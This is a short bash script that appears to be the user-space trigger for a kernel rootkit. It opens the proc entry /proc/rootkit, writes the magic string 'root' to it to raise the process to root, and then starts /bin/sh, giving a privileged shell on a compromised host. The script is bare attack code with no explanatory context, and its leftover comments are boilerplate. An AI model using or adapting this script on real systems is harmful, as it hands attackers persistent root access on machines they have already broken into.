#!/bin/bash
FILENAME="/proc/rootkit"
# Opening file descriptors # 3 for reading and writing
# i.e. /tmp/out.txt
exec 3<>$FILENAME

# Write to file
echo "root" >&3

exec "/bin/sh"
# close fd # 3
exec 3>&-